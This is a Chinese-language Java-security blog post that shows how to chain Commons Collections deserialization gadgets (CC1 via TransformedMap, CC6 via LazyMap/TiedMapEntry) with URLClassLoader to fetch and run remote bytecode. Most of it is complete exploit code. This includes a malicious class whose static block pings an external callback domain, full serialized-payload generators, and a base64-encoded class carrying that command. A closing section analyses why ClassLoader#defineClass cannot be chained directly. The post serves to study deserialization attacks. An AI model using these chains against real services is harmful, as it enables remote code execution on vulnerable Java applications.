---
layout: mypost
title: "动态加载字节码的应用"
categories: [Java安全]
---

## 前言

大概半个月之前写过一篇文章-->“动态加载字节码技术”，其中提到除了用forname去加载字节码文件，还可以用loadClass函数去加载字节码文件，在loadClass函数的基础上进一步使用URLClassLoader加载远程class文件和ClassLoader#defineClass直接加载字节码。现在sink的危害不单单是`Runtime.getRuntime().exec("xxx")`了，而是可以去加载任意的恶意的字节码文件，但现在新的问题又出现了，如何才能去触发sink呢？

嗯对，可以去反序列化！将CommonCollections链与动态加载字节码结合使用，扩大危害。

## 准备工作

需要提前编译好一个DNS.class，并把它移动到其他目录下，在该目录下启动一个http服务器，其中DNS.java内容如下-->

```java
public class DNS {
    static{
        try {
            Runtime.getRuntime().exec("ping 6y7d5.cxsys.spacestabs.top");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

## 在URLClassLoader加载字节码上加点料

使用URLClassLoader加载远程class文件方法有四种，这里针对使用 Http 协议的加载去研究（其他三种照猫画虎即可），代码如下-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("http://localhost:8000/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();
    }
}
```

拿CC1、CC6来看，它们的sink都是在InvokerTransformer.transform方法中，详情如下-->

![](image-122.png)

实际上也就是自实现了一个invoke的反射调用，不多赘述了。那么理论上来讲，只要把上面的demo代码全部改成InvokerTransformer的写法，就可以让CC链去实现一个动态加载字节码的功能，先修改一下Loader代码，变成反射的写法，如下-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.net.URLClassLoader");
        URL[] urls = {new URL("http://localhost:8000/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = (Class) clazz.getMethod("loadClass", String.class).invoke(urlClassLoader, "DNS");
        c.newInstance();
    }
}
```

运行代码成功触发DNS请求，如下-->

![](image-48.png)

但其实还不够，因为loadClass并不会去初始化一个类，那么DNS类中的静态代码块并不会执行，针对于`c.newInstance();`这一行代码也要改成反射的写法，最终这个也是要放到chainedTransformer中作为一个节点，改写成反射如下-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.net.URLClassLoader");
        URL[] urls = {new URL("http://localhost:8000/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = (Class) clazz.getMethod("loadClass", String.class).invoke(urlClassLoader, "DNS");
        Class.class.getMethod("newInstance").invoke(c);
    }
}
```

接着就是把上述代码改成InvokerTransformer的写法，挺简单的，这里拿CC1那条链子（走TransformedMap的那条）举例，代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

public class CC1ClassLoader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("http://localhost:8000/")};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(new URLClassLoader(urls)),
                new InvokerTransformer(
                        "loadClass",
                        new Class[]{String.class},
                        new Object[]{"DNS"}),
                new InvokerTransformer(
                        "newInstance",
                        new Class[0],
                        new Object[0])
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, transformedMap);
        serializeObject(instance);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

运行就会发现，代码在序列化时候就报错-->

![](image-123.png)

URLClassLoader类是没有继承Serializable接口的，如下-->

![](image-124.png)

其实和CC1、CC6一样，通过反射去加载即可，而观察URLClassLoader类发现它重写了newInstance方法，如下-->

![](image-125.png)

是一个静态方法，这个Runtime类很像了，先在Loader类上改写一下，如下-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Test {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("http://localhost:8000/")};
        Class<?> clazz = Class.forName("java.net.URLClassLoader");
        URLClassLoader urlClassLoader = (URLClassLoader) clazz.getMethod("newInstance",URL[].class).invoke(null,new Object[] {urls});
        Class c = (Class) clazz.getMethod("loadClass", String.class).invoke(urlClassLoader, "DNS");
        Class.class.getMethod("newInstance").invoke(c);
    }
}
```

运行代码成功触发DNS请求，如下-->

![](image-48.png)

再将上述代码改写成InvokerTransformer的写法，如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class CC1ClassLoader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("http://localhost:8000/")};
        Class<?> clazz = Class.forName("java.net.URLClassLoader");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"newInstance", new Class[]{URL[].class}}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[]{urls}}
                ),
                new InvokerTransformer(
                        "loadClass",
                        new Class[]{String.class},
                        new Object[]{"DNS"}),
                new InvokerTransformer(
                        "newInstance",
                        new Class[0],
                        new Object[0])
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, transformedMap);
        serializeObject(instance);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

运行代码成功触发DNS请求，如下-->

![](image-48.png)

至此成功的给URLClassLoader加载字节码去加了点料（CC1）。当然，CC1可以，那么CC6同样可以，代码如下-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class CC6ClassLoader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("http://localhost:8000/")};
        Class<?> clazz = Class.forName("java.net.URLClassLoader");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"newInstance", new Class[]{URL[].class}}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[]{urls}}
                ),
                new InvokerTransformer(
                        "loadClass",
                        new Class[]{String.class},
                        new Object[]{"DNS"}),
                new InvokerTransformer(
                        "newInstance",
                        new Class[0],
                        new Object[0])
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

运行代码成功触发DNS请求，如下-->

![](image-48.png)

其他的CC链（只要sink和CC1、CC6类似）就不赘述了，照猫画虎即可。

## 在ClassLoader#defineClass上加点料

同样的，用ClassLoader#defineClass去加载字节码能不能延续上面的思路呢？由于defineClass方法是一个protected方法，如下-->

![](image-126.png)

所以需要反射去使用`getDeclaredMethods()`和`setAccessible(true)`来完成方法的调用，给一个demo-->

```java
import java.lang.reflect.Method;
import java.util.Base64;

public class Loader {
    public static void main(String[] args) throws Exception {
        ClassLoader appClassLoader = Loader.class.getClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass",
                String.class,
                byte[].class,
                int.class,
                int.class
        );
        defineClass.setAccessible(true);
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKAoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB0BAApTb3VyY2VGaWxlAQAIRE5TLmphdmEMAAoACwcAIgwAIwAkAQAfcGluZyA2eTdkNS5jeHN5cy5zcGFjZXN0YWJzLnRvcAwAJQAmAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACcBAANETlMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAgABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAMADgAAAAwAAQAAAAUADwAQAAAACAARAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAYACQAJAAwABwANAAgAFgAKAA4AAAAMAAEADQAJABIAEwAAABQAAAAHAAJMBwAVCQABABYAAAACABc=");
        Class hello = (Class)defineClass.invoke(appClassLoader, "DNS", code, 0, code.length);
        hello.newInstance();
    }
}
```

逐行去看，不难发现这一行代码`defineClass.setAccessible(true);`是没有返回值的。

```
// 无法形成链式结构：
getDeclaredMethod(...).setAccessible(true).invoke(...) // 错误！
```

虽然`defineClass.setAccessible(true);`能改成invoke的形式，但与代码上下文串不起来，无法形成链式结构。这行代码直接导致了InvokerTransformer不能使用ClassLoader#defineClass去加载字节码！

看来直接使用ClassLoader调用defineClass方法这条路被堵死了，唯一的解决方案就是去寻找重写过defineClass方法的类，且重写后的方法最好是public的，当然default、protected、private的也行，但是最终要能被public的类或者是方法去调用到。

现在就是要找哪里调用了defineClass方法，排除没用的剩下两处，其中一处和BCEL加载字节码相关、另外一处就是大名鼎鼎的TemplatesImpl加载字节码，可以说这两个耳熟能详的技术根源是在这里！他俩在Fastjson等漏洞的利用中经常出现，所以说，Java安全中一切都是有迹可循的。

![](image-131.png)

Tips：细心一点其实还可以发现一直提到的ClassLoader#defineClass方法写全了是`protected final Class<?> defineClass(String name, byte[] b, int off, int len)`，它其实会去调用`defineClass(name, b, off, len, null);`，如下-->

![](image-130.png)

多了一个参数，而这个方法全称是`protected final Class<?> defineClass(String name, byte[] b, int off, int len,ProtectionDomain protectionDomain)`，最终会在这个方法中去调用`native Class<?> defineClass1(xxx)`，如下-->

![](image-132.png)

所以更底层一点的应该是`protected final Class<?> defineClass(String name, byte[] b, int off, int len,ProtectionDomain protectionDomain)`这个函数，而它也是protected final，按理来说也是可以找重写过这个方法的类去实现加载字节码，看一下它的调用关系，如下-->

![](image-133.png)

有三个，其中第一个就是loadClass去干的事情，在上面也已经成功的写出了一个POC（CC1、CC6加载字节码），马马虎虎相当于给ClassLoader#defineClass加料了。

第二个SecureClassLoader类它的全部方法（包括构造方法）都是protected、private的，必须用`setAccessible(true)`修改，上面也阐述过，这样是不行的，详情见下-->

![](image-135.png)

第三个NoCallStackClassLoader类它的构造方法是public的，findClass方法是protected的，但类中并没有去用到findClass方法，所以也是必须用`setAccessible(true)`修改，同样是走不通的，详情见下-->

![](image-134.png)

本文分析了这么多，也算是看清了BCEL和TemplatesImpl这两个字节码加载技术的前世（还没有今生），同样也说明，若想要把ClassLoader#defineClass同CC等链相结合必须要在BCEL类和TemplatesImpl类上面继续做文章...